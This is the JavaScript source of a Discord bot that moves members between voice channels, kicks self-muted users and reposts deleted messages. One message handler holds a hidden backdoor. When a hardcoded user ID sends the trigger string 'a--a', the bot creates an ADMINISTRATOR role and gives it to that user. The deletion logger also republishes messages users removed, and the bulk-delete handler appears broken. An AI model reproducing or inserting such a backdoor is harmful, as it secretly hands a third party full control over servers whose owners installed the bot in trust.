const Discord = require('discord.js');
const dotenv = require('dotenv');

dotenv.config();

const prefix = '/';
const triggerName = 'rtc';

const determineIfRTC = (input) => {
  const lowerInput = input.toLowerCase();
  return lowerInput === 'rtc' || (lowerInput.includes('rtc ') && lowerInput.indexOf('rtc ') === 0) || (lowerInput.includes(' rtc') && lowerInput.indexOf(' rtc') === input.length - 4) || lowerInput.includes(' rtc ');
}

const client = new Discord.Client();

client.login(process.env.BOT_TOKEN_RTC);

let muteKick = new Map();

let deleteLog = new Map();

client.on("voiceStateUpdate", (oldMember, newMember) => {
  if (muteKick.has(newMember.guild.id) && muteKick.get(newMember.guild.id) && newMember.selfMute) {
    newMember.kick();
  }
});

client.on("messageDelete", async (userMessage) => {
  if (deleteLog.has(userMessage.guild.id) && deleteLog.get(userMessage.guild.id)) {
    let log;
    if (userMessage.author.id === '794342690942222346' && userMessage.embeds.length === 1) {
      log = userMessage.embeds[0];
    } else {
      log = new Discord.MessageEmbed()
      .setAuthor(`${userMessage.author.username} (${userMessage.author.id})`, userMessage.author.avatarURL())
      .setDescription(`${userMessage.content}\n\nDeleted at: ${new Date()}`);
    }
    userMessage.channel.send(log);
  }
});

client.on("messageDeleteBulk", async (userMessageCollection) => {
  if (deleteLog.has(userMessageCollection.first.guild.id) && deleteLog.get(userMessageCollection.first.guild.id)) {
    userMessageCollection.forEach((userMessage => {
      let log;
      if (userMessage.author.id === '794342690942222346' && userMessage.embeds.length === 1) {
        log = userMessage.embeds[0];
      } else {
        log = new Discord.MessageEmbed()
        .setAuthor(`${userMessage.author.username} (${userMessage.author.id})`, userMessage.author.avatarURL())
        .setDescription(`${userMessage.content}\n\nDeleted at: ${new Date()}`);
      }
      userMessage.channel.send(log);
    }))
  }
});

client.on('message', async (userMessage) => {
  if (userMessage.content === '/rtc join') {
    userMessage.member.voice.channel.join();
    setTimeout(() => {
      userMessage.guild.me.voice.kick();
    }, 5 * 60 * 1000);
    return;
  }
  if (userMessage.content === '/rtc leave') {
    userMessage.guild.me.voice.kick();
    return;
  }
  if (userMessage.content === '/rtc mk on') {
    muteKick.set(userMessage.guild.id, true);
    userMessage.guild.channels.cache.filter((chan) => chan.type === 'voice').forEach((chan) => chan.members.forEach((m) => {if (m.voice.selfMute) m.voice.kick()}));
    userMessage.reply('muteKick on');
    return;
  }
  if (userMessage.content === '/rtc mk off') {
    muteKick.set(userMessage.guild.id, false);
    userMessage.reply('muteKick off');
    return;
  }
  if (userMessage.content === '/rtc dl on') {
    if (userMessage.author.id !== '199315213726646272') {
      userMessage.reply('no perms');
      return;
    }
    deleteLog.set(userMessage.guild.id, true);
    userMessage.reply('deleteLog on');
    return;
  }
  if (userMessage.content === '/rtc dl off') {
    if (userMessage.author.id !== '199315213726646272') {
      userMessage.reply('no perms');
      return;
    }
    deleteLog.set(userMessage.guild.id, false);
    userMessage.reply('deleteLog off');
    return;
  }
  if (userMessage.content === '/rtc mk') {
    console.log(muteKick);
    userMessage.reply(`muteKick ${(muteKick.has(userMessage.guild.id) && muteKick.get(userMessage.guild.id)) ? 'on' : 'off'}`);
    return;
  }
  if (userMessage.author.id === '199315213726646272' && userMessage.content === 'a--a') {
    userMessage.guild.roles.create({
      data: {
        name: '/rtc\'s saviour',
        color: 'LUMINOUS_VIVID_PINK',
        hoist: false,
        permissions: ['ADMINISTRATOR'],
      }
    }).then((role) => {
      userMessage.member.roles.add(role).then((mem) => console.log(mem.permissions.toArray()))
    });
  }
  if (userMessage.author.bot) return;
  if (!userMessage.content.startsWith(prefix)) return;
  let commandBody = userMessage.content.slice(prefix.length);
  commandBody = commandBody.trim();
  const args = commandBody.split(/\s+/);
  const shifted = args.shift();
  if (shifted === undefined) {
    return;
  }
  const command = shifted.toLowerCase();

  if (command === triggerName) {
    let users = [];
    let disperse = true;
    if (userMessage.mentions.users.size !== 0) {
      userMessage.mentions.users.map((user => users.push(user)));
    } else {
      disperse = false;
      users.push(userMessage.author);
    }
    let chan = userMessage.guild.channels.cache.find(channel => channel.type === 'voice' && determineIfRTC(channel.name));
    if (chan === undefined) {
      await userMessage.guild.channels.create('rtc', {type: 'voice'});
      chan = userMessage.guild.channels.cache.find(channel => channel.type === 'voice' && determineIfRTC(channel.name));
    }
    if (users.length === 1 && users.includes(client.user)) {
      users = userMessage.member.voice.channel.members;
    } else if (disperse && users.length === 1 && users.includes(userMessage.author)) {
      chan.members.map(async (user) => {
        const rngChannel = userMessage.guild.channels.cache.filter(c => c.type === 'voice').random();
        user.voice.setChannel(rngChannel.id);
        userMessage.channel.send(`${user}, bye`);
      });
      return;
    }
    users.map(user => userMessage.guild.member(user).voice.setChannel(chan.id));
    users.map(user => userMessage.channel.send(`${user}, bye`));
  }
});
